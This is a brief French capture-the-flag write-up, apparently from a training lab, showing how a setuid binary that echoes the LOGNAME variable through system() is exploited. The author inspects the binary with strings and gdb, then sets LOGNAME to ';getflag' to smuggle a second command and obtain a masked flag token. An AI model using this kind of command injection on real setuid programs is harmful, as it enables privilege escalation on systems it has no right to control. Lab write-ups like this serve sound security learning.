Qui suis-je? Ou suis-je?
$ ls -la
-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07
(un binaire setuid setgid, file comfirme)

$ ./level07
level07

$ strings level07
(Il utilise system et affiche avec un echo %s)

$ gdb level07 -> disas main
(il utilise asprintf, surement pour completer une chaine avec le echo et la passer a system)
(Il fait un getenv, pour trouver "level07"?)

$ env | grep level07
USER=level07
MAIL=/var/mail/level07
PWD=/home/user/level07
HOME=/home/user/level07
LOGNAME=level07

$ export LOGNAME=coucou
$ ./level07
coucou

$ export LOGNAME=';getflag'
$ ./level07

Check flag.Here is your token : XXXXXXXXXXXXXXXXxx
